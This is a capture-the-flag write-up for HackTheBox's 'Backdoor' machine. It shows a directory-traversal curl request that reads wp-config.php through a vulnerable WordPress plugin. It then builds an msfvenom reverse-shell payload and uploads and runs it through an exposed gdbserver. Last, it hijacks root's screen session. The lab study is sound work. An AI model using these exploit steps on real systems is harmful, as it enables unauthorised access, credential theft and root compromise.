---
description: https://app.hackthebox.com/machines/Backdoor
---

# Backdoor

## Nmap

```
nmap 10.10.11.125 -p- -sS -sV         

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add "10.10.11.125 backdoor.htb" to /etc/hosts.
{% endhint %}

First up, checking port 1337 which `nmap` pick up as waste?. I was unable to pull any information from this service.

Connecting with `nc` did not send back any information. The same process repeated with `Wireshark` also showed no information from this port.

![](<../../../.gitbook/assets/image (360).png>)

As such we will proceed to port 80 which, appears to be running `Wordpress` as shown below:

![](<../../../.gitbook/assets/image (190).png>)

Standard enumeration with `feroxbuster` shows multiple typical WordPress `PHP` files.

![](<../../../.gitbook/assets/image (291).png>)

Instead we jump over to `wpscan` in order to further enumerate the WordPress site. The following command was run to search all available plugins for known exploits.

```bash
wpscan --url http://backdoor.htb -t 40 --detection-mode mixed --enumerate ap --plugins-detection aggressive
```

`wpscan` soon finds the vulnerable plugin `ebook-download` which is running version 1.1.

![](<../../../.gitbook/assets/image (256).png>)

`Searchsploit` shows a known exploit for eBook Download 1.1 for Directory Traversal.

![](<../../../.gitbook/assets/image (1087).png>)

**Exploit-DB:** [https://www.exploit-db.com/exploits/39575](https://www.exploit-db.com/exploits/39575)

With the following shown as a PoC:

```bash
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

Testing this against the target system's WordPress site proves successful. We are able to read `/wp-settings.php`.

```bash
curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php"
```

![](<../../../.gitbook/assets/image (219).png>)

As shown above, this reveals the DB\_Password value. I tried to use this against the _admin_ account and the _wordpressuser_ account and was unable to proceed through either the login page or SSH against standard accounts.

From here, further enumeration through `LFI` will be required. I started `ZAP Proxy` and sent a manual request through with the Directory Traversal PoC.

![](<../../../.gitbook/assets/image (52).png>)

We get some interesting `LFI` results, however none that are of any use to us.

![](<../../../.gitbook/assets/image (1260).png>)

After much further enumeration I decided to search for running processes and their corresponding command lines. This is usually found under `/proc/PID/cmdline`. Where below the request will start with '1' and then, a number file through to 1000 will be generated using the 'numberzz' module in `ZAP Proxy`.

![](<../../../.gitbook/assets/image (359).png>)

As shown below PID 816 shows `gdbserver` running on pot 1337 which we did not get any results for earlier.

![](<../../../.gitbook/assets/image (129).png>)

`Searchsploit` shows this could be vulnerable to `RCE`.

![](<../../../.gitbook/assets/image (285).png>)

BookHackTricks has a great page on a few ways to exploit `gdbserver`.

**BookHackTricks:** [https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver#upload-and-execute](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver#upload-and-execute)

```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.11.125:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run
```

![](<../../../.gitbook/assets/image (167).png>)

Where a shell is caught on our listener.

![](<../../../.gitbook/assets/image (1688).png>)

{% hint style="info" %}
Metasploit can also be used to exploit gdbserver.

use exploit/multi/gdb/gdb\_server\_exec
{% endhint %}

Performing enumeration with `linpeas.sh` we have an interesting find pop up under the running processes and crons section.

![](<../../../.gitbook/assets/image (29) (1).png>)

Looking at the above parameters we can see the from the screen help output below, that `-dmS` is used to start a screen daemon then disconnect it. In the case of above as root.

![](<../../../.gitbook/assets/image (414).png>)

The manual for screen can be found below: [https://www.gnu.org/software/screen/manual/screen.html](https://www.gnu.org/software/screen/manual/screen.html)

The linked forum post on Serverfault shows how we can identify existing screen sessions.

**Serverfault:** [https://serverfault.com/questions/758637/owner-of-screen-session](https://serverfault.com/questions/758637/owner-of-screen-session)

![](<../../../.gitbook/assets/image (362).png>)

Looking further on how to connect to other users screen sessions, this forum post from 2006 describes it well: [https://ubuntuforums.org/showthread.php?t=299286](https://ubuntuforums.org/showthread.php?t=299286)

![](<../../../.gitbook/assets/image (148).png>)

As we know the root user account is currently running a screen session we can then connect to it. We know the session name from the running processes we found from `linpeas.sh`.

```bash
screen -x "<host_username>/<sessionname>"
/var/run/screen -x root/root
```

Which gets us a `root` shell.

![](<../../../.gitbook/assets/image (126) (2).png>)
